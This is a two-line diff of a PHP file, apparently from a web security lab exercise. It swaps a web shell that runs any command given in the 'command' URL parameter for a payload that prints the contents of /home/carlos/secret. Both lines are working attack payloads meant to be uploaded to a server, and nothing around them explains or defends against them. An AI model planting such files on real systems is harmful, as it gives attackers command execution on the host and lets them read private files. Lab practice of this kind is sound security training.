@@ -1,1 +1,1 @@
-<?php echo system($_GET['command']); ?>
+<?php echo file_get_contents('/home/carlos/secret'); ?>
